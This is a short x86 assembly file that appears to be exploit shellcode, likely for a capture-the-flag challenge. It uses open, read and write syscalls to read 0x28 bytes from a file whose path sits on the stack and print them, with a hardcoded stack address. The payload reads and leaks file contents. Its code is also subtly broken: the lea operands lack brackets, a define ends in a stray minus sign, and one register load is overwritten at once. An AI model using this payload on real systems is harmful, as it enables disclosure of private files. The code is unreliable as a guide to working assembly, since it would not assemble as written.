;name  | %eax | %ebx | %ecx | %edx
;open  | 0x05 | ptr  | flag | mode
;read  | 0x03 | fd   | buf  | size
;write | 0x04 | fd   | buf  | size

global _start

%define stack_addr 0xffffd710 - 

_start:
    lea eax, esp + 0x20
    mov ebx, eax
    mov eax, 0x5
    xor ecx, ecx
    int 0x80
    mov ebx, eax
    lea eax, esp + 0x20
    mov ecx, eax
    mov eax, 0x3
    mov edx, 0x28
    int 0x80
    lea eax, esp + 0x20
    mov eax, 0x04
    mov ecx, stack_addr
    mov ebx, 0x1
    mov edx, 0x28
    int 0x80
